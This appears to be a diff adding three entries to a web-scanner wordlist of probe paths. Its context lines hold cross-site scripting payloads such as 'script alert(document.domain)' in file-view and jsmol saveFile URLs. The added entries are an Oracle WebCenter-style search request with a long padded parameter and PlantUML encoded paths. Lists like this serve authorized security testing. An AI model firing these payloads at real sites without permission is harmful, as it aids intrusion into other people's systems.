@@ -970,3 +970,6 @@ request?info=<svg onload=alert(
 /index.php?explorer/fileView&path=</script><script>alert(document.domain)</script>
 :4040/jobs/?\
 /filter/jmol/js/jsmol/php/jsmol.php?call=saveFile&data=%3Cscript%3Ealert(document.domain)%3C/script%3E&mimetype=text/html
+/cs/idcplg?IdcService=GET_SEARCH_RESULTS&ResultTemplate=StandardResults&ResultCount=20&FromPageUrl=/cs/idcplg?IdcService=GET_DYNAMIC_PAGEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\
+/uml/SyfFKj2rKt3CoKnELR1Io4ZDoSa70000
+/plantuml/uml/SyfFKj2rKt3CoKnELR1Io4ZDoSa70000
